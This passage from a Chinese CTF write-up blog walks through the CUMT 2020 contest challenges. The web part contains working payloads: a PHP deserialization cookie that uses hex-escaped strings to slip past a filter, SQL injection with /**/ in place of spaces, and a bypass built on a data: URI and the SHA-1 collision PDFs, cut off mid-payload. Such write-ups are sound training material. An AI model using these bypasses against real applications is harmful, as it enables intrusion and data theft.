punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$todos</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$todo</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$todos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$h</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'todos'</span><span class="token punctuation">,</span> <span class="token variable">$h</span><span class="token punctuation">.</span><span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: '</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// flag is in flag.php</span><span class="token delimiter">?></span> <span class="token delimiter">&lt;?php</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$todos</span> <span class="token keyword">as</span> <span class="token variable">$todo</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token delimiter">?></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$todo</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">endforeach</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><p>只需要控制source的值即可</p><pre class=" language-php"><code class="language-php">    <span class="token delimiter">&lt;?php</span>    <span class="token keyword">Class</span> <span class="token class-name">Source</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'license.txt'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>       <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$s</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>       <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$s</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//a:1:{i:0;O:6:"Source":1:{s:6:"source";s:8:"flag.php";}}</span><span class="token delimiter">?></span></code></pre><p>但是还是check了flag字符串，payload中不能出现flag</p><p>有个小trick</p><blockquote><h3 id="string-型数据的序列化"><a href="#string-型数据的序列化" class="headerlink" title="string 型数据的序列化"></a><a href="https://www.neatstudio.com/show-161-1.shtml" target="_blank" rel="noopener">string 型数据的序列化</a></h3><p>s:<code>&lt;length&gt;</code>:”<code>&lt;value&gt;</code>“;</p><p>其中 <code>&lt;length&gt;</code> 是 <code>&lt;value&gt; </code>的长度，<code>&lt;length&gt; </code> 是非负整数，数字前可以带有正号（+）。<code>&lt;value&gt; </code>为字符串值，这里的每个字符都是单字节字符，其范围与 ASCII 码的 0 -  255 的字符相对应。每个字符都表示原字符含义，没有转义字符，<code>&lt;value&gt;</code> 两边的引号（””）是必须的，但不计算在  <code>&lt;length&gt;</code> 当中。这里的 <value> 相当于一个字节流，而 <code>&lt;length&gt;</code>  是这个字节流的字节个数。</p><p>S:<code>&lt;length&gt;</code>:”<code>&lt;value&gt;</code>“;</p><p>其中 <code>&lt;length&gt; </code>是源字符串的长度，而非<code>  &lt;value&gt;</code> 的长度。<code>&lt;length&gt;</code> 是非负整数，数字前可以带有正号（+）。<code>&lt;value&gt;</code> 为经过转义之后的字符串。</p><p>它的转义编码很简单，对于 ASCII 码小于 128 的字符（但不包括 \），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \ 作为开头，后面两个字节分别是这个字符的 16  进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1  位作为第二个字节。依次编码下来，得到的就是 <code>&lt;value&gt;</code> 的内容了。</p></blockquote><p>所以将s改为S，flag.php用16进制\66\6c\61\67\2e\70\68\70表示</p><p>cookie在存储时，存储的是url编码后的数据，调用cookie时，会先进行url解码，所以将payload先url编码一次</p><p>最终payload</p><pre class=" language-php"><code class="language-php">todos<span class="token operator">=</span>a170de677c96a2097c4d580cea16e0cba<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">%</span>7Bi<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">%</span>22Source<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">%</span>7Bs<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">%</span>22source<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>S<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">5C66</span><span class="token operator">%</span>5C6c<span class="token operator">%</span><span class="token constant">5C61</span><span class="token operator">%</span><span class="token constant">5C67</span><span class="token operator">%</span>5C2e<span class="token operator">%</span><span class="token constant">5C70</span><span class="token operator">%</span><span class="token constant">5C68</span><span class="token operator">%</span><span class="token constant">5C70</span><span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">7D</span></code></pre><p>加在cookie中提交即可</p>]]></content>
      
      
      <categories>
          
          <category> cumtCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cumt2020九月校赛 by 水一水</title>
      <link href="/2020/09/26/cumtctf2020-jiu-yue-xiao-sai/"/>
      <url>/2020/09/26/cumtctf2020-jiu-yue-xiao-sai/</url>
      
        <content type="html"><![CDATA[<h2 id="MSIC"><a href="#MSIC" class="headerlink" title="MSIC"></a>MSIC</h2><h3 id="连签到都算不上"><a href="#连签到都算不上" class="headerlink" title="连签到都算不上"></a>连签到都算不上</h3><p>题目给出一个压缩包，看到里面txt，猜是base64加密后图片，解码后得到一个二维码，然后扫码得到\u开头的字符串，用java输出得到字符串，再用核心价值观解码，得到flag。</p><p>真·签到题</p><p>题目给了一个压缩包，猜测是伪加密。考虑到伪加密在kali，mac等系统中可直接打开。于是将压缩包拖到虚拟机中解压。</p><p><img src="../../../../medias/img//clip_image002(2).jpg" alt="img"></p><p>得到一个图片，将它放到winhex中分析发现最后有一串base64加密的字符串。</p><p><img src="../../../../medias/img//clip_image004(2).jpg" alt="img"></p><pre><code>Base64解密得到：EWOVEVH{U1ip_kp_uweeguuhw11a!} </code></pre><p>对比CUMTCTF{，，，}格式可以发现，将该字符串字母左移两位即可得到flag。</p><p><img src="../../../../medias/img//clip_image006(2).jpg" alt="img"></p><h3 id="兔兔那么可爱"><a href="#兔兔那么可爱" class="headerlink" title="兔兔那么可爱"></a>兔兔那么可爱</h3><p>题目给了一张图片和一个不知道什么格式的flag文件，根据hint，图片没什么用，将flag文件用txt打开，发现第12358个字符组成CUMTCT，猜测是斐波那契数列，于是写python脚本将对应位置的字符打印出来得到flag。</p><p><img src="../../../../medias/img//clip_image008(2).jpg" alt="img"></p><h3 id="别做题了听歌吧"><a href="#别做题了听歌吧" class="headerlink" title="别做题了听歌吧"></a>别做题了听歌吧</h3><p>题目给了一个MP3文件，应该是音频隐写，用工具MP3Stego，根据题目的提示“别问，问就是cumt”，猜测cumt是密码，于是解密得到</p><p><img src="../../../../medias/img//clip_image010.jpg" alt="img"></p><p>这样一个txt，打开发现是一堆长短不一的空白格，将其转换成Morse编码，有</p><p><img src="../../../../medias/img//clip_image012.jpg" alt="img"></p><p>解码得到<code>M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O</code></p><p>加上格式<code>CUMTCTF{M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O}</code>即为flag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="幼儿园的密码题"><a href="#幼儿园的密码题" class="headerlink" title="幼儿园的密码题"></a>幼儿园的密码题</h3><p>题目直接给出e,c,n</p><p><img src="../../../../medias/img//clip_image014.jpg" alt="img"></p><p>解出p,q</p><p><img src="../../../../medias/img//clip_image016.jpg" alt="img"></p><p>然后得到flag。</p><h3 id="小学生的密码题"><a href="#小学生的密码题" class="headerlink" title="小学生的密码题"></a>小学生的密码题</h3><p>阅读Python代码，显然最后编码后的结果以0为分界线，由于print去除了最后末尾的0，补全后，编码结果应该为：</p><p>```</p><p>21088410841088402108840420888888821088810888884210888888410888421088881088888820888841088842108820888881088884210888880888888408888888410</p><p>```</p><p>如果逆向出发未免太烦了，考虑到对于每个字符的编码函数为：</p><pre><code>    res = &quot;&quot;​    if i &gt;= 8:​      res += int(i/8)*&quot;8&quot;​     if i%8 &gt;=4:​      res += int(i%8/4)*&quot;4&quot;​    if i%4 &gt;=2:​      res += int(i%4/2)*&quot;2&quot;​    if i%2 &gt;= 1:​      res += int(i%2/1)*&quot;1&quot;</code></pre><p>将其处理成函数，将0-127的字符全部进行编码，形成哈希映射。</p><p>对编码后的结果以0为分隔符分割，得到list，而后迭代获取对应则得到了flag。</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>直接用nc连接上题目给的端口，肯定自己是个女生，然后得到学长base64加密的联系方式和密码，解密后，加上学长，然后就可以得到flag了。</p><h3 id="Babystack"><a href="#Babystack" class="headerlink" title="Babystack"></a>Babystack</h3><p>将题目文件拖进IDA然后简单分析，得到只要回答1_love_y0u就可以拿到shell，cat flag就行了</p><p><img src="../../../../medias/img//clip_image018.jpg" alt="img"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="re1-连个签到的分都不给你"><a href="#re1-连个签到的分都不给你" class="headerlink" title="re1-连个签到的分都不给你"></a>re1-连个签到的分都不给你</h3><p>直接拖进IDA用shift＋f12查看字符串得到flag</p><p><img src="../../../../medias/img//clip_image020.jpg" alt="img"></p><h3 id="re2-兄弟们快来帮帮萄萄"><a href="#re2-兄弟们快来帮帮萄萄" class="headerlink" title="re2-兄弟们快来帮帮萄萄"></a>re2-兄弟们快来帮帮萄萄</h3><p>根据题目提示，下载相应的upx版本，对题目文件进行脱壳，拖进IDA然后同第一题，直接shift+f12查看字符串得到flag</p><h3 id="re3-python题禁止py"><a href="#re3-python题禁止py" class="headerlink" title="re3-python题禁止py"></a>re3-python题禁止py</h3><p>根据题目python字节码反向写出python代码</p><p><img src="../../../../medias/img//clip_image022.jpg" alt="img"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h3><p>按照题目要求，构造GET 1和POST 2的语句</p><p><img src="../../../../medias/img//clip_image024.jpg" alt="img"></p><p>然后题目给出源码</p><p>直接加上file=flag.php</p><p>发现flag</p><p><img src="../../../../medias/img//clip_image026.jpg" alt="img"></p><h3 id="Babysqli"><a href="#Babysqli" class="headerlink" title="Babysqli"></a>Babysqli</h3><p>通过测试，发现空格和and会被检测，空格用/**/代替</p><p>通过union select挨个测试，发现长度为8，而且4有回显，</p><p>在4的位置直接用构造sql语句</p><p><img src="../../../../medias/img//clip_image028.jpg" alt="img"></p><p>得到<code>flag：CUMTCTF{27ec8034-c9fe-0cfd-d92a-84362ecf0e42}</code></p><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>打开发现是个图片，保存下来，用winhex打开，发现里面有php代码，保存下来（也能直接扫到<a href="http://www.zip,)/" target="_blank" rel="noopener">www.zip,）</a></p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Secret<span class="token operator">?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>The dream of a great singer<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./secret.jpg<span class="token punctuation">"</span></span>  <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>The dream of a great singer<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$str1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'Suvin_wants_a_girlfriend'</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Suvin doesn't like you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$str2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Suvin prefers strings of Numbers'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token operator">&lt;</span><span class="token number">3600</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Suvin says the num is too short'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token operator">></span><span class="token number">3600</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">31</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Suvin says the num is too long'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"Suvin says he's falling in love with you!"</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$str1</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$str2</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1000</span><span class="token punctuation">)</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"It's too long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$str1</span><span class="token operator">!==</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                 <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"It's so similar to md5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>用burpsuite抓包</p><p>利用data:协议绕过第一个die，利用16进制把2,592,001转变成0x278d01绕过第二个die，</p><p> 最后一个绕过sha1，由于string转换了下，所以不能用数组绕过，直接找sha1碰撞，谷歌放出了第一例sha1碰撞</p><p><a href="https://blog.csdn.net/caiqiiqi/article/details/68953730" target="_blank" rel="noopener">分析</a></p><p>payload：</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//202.119.201.197:13005/?param1=data:text/plain,Suvin_wants_a_girlfriend&amp;param2=0x278d01</span><span class="token constant">POST</span><span class="token punctuation">:</span>param1<span class="token operator">=</span><span class="token operator">%</span><span class="token constant">25PDF</span><span class="token number">-1.3</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token constant">E2</span><span class="token operator">%</span><span class="token constant">E3</span><span class="token operator">%</span><span class="token constant">CF</span><span class="token operator">%</span><span class="token constant">D3</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0A1</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span>20obj<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">3C</span><span class="token operator">%</span><span class="token constant">3C</span><span class="token operator">/</span>Width<span class="token operator">%</span><span class="token number">202</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Height<span class="token operator">%</span><span class="token number">203</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Type<span class="token operator">%</span><span class="token number">204</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Subtype<span class="token operator">%</span><span class="token number">205</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Filter<span class="token operator">%</span><span class="token number">206</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>ColorSpace<span class="token operator">%</span><span class="token number">207</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Length<span class="token operator">%</span><span class="token number">208</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>BitsPerComponent<span class="token operator">%</span><span class="token number">208</span><span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span>0Astream<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">D8</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">24SHA</span><span class="token number">-1</span><span class="token operator">%</span>20is<span class="token operator">%</span>20dead<span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">85</span><span class="token operator">/</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span>239u<span class="token operator">%</span><span class="token constant">9C9</span><span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token constant">C6</span><span class="token operator">%</span><span class="token constant">3CL</span><span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token constant">E1</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token constant">7FF</span><span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token constant">A6</span><span class="token operator">%</span><span class="token constant">B6</span><span class="token operator">%</span><span class="token constant">7E</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span><span class="token constant">9A</span><span class="token operator">%</span><span class="token constant">AA</span><span class="token operator">%</span><span class="token constant">1D</span><span class="token operator">%</span><span class="token constant">B2V</span><span class="token operator">%</span><span class="token constant">0BE</span><span class="token operator">%</span>CAg<span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token number">88</span><span class="token operator">%</span><span class="token constant">C7</span><span class="token operator">%</span><span class="token constant">F8K</span><span class="token operator">%</span>8CLy<span class="token operator">%</span><span class="token constant">1F</span><span class="token operator">%</span><span class="token constant">E0</span><span class="token operator">%</span><span class="token constant">2B</span><span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span><span class="token constant">F6</span><span class="token operator">%</span><span class="token number">14</span><span class="token operator">%</span>F8m<span class="token operator">%</span>B1i<span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span>C5kE<span class="token operator">%</span><span class="token constant">C1S</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">%</span><span class="token constant">B7</span><span class="token operator">%</span><span class="token number">608</span><span class="token operator">%</span>E9rr<span class="token operator">/</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span>ADr<span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token constant">0EI</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token constant">E0F</span><span class="token operator">%</span><span class="token constant">C20W</span><span class="token operator">%</span><span class="token constant">0F</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">E1</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token constant">F5</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token number">94</span><span class="token operator">%</span><span class="token constant">2B</span><span class="token operator">%</span><span class="token constant">E35B</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">-</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token constant">0F</span><span class="token operator">%</span><span class="token constant">2A3</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token constant">C3</span><span class="token operator">%</span><span class="token constant">7F</span><span class="token operator">%</span><span class="token constant">AC5</span><span class="token operator">%</span><span class="token number">14</span><span class="token operator">%</span><span class="token constant">E7M</span><span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">%</span><span class="token constant">0F</span><span class="token operator">%</span><span class="token constant">2C</span><span class="token operator">%</span><span class="token constant">C1</span><span class="token operator">%</span>A8t<span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span>0Cx0Z<span class="token operator">%</span>21Vda0<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">89</span><span class="token operator">%</span>60k<span class="token operator">%</span><span class="token constant">D0</span><span class="token operator">%</span><span class="token constant">BF</span><span class="token operator">%</span><span class="token constant">3F</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A8</span><span class="token operator">%</span><span class="token constant">04F</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">&amp;</span>param2<span class="token operator">=</span><span class="token operator">%</span><span class="token constant">25PDF</span><span class="token number">-1.3</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token constant">E2</span><span class="token operator">%</span><span class="token constant">E3</span><span class="token operator">%</span><span class="token constant">CF</span><span class="token operator">%</span><span class="token constant">D3</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0A1</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span>20obj<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">3C</span><span class="token operator">%</span><span class="token constant">3C</span><span class="token operator">/</span>Width<span class="token operator">%</span><span class="token number">202</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Height<span class="token operator">%</span><span class="token number">203</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Type<span class="token operator">%</span><span class="token number">204</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Subtype<span class="token operator">%</span><span 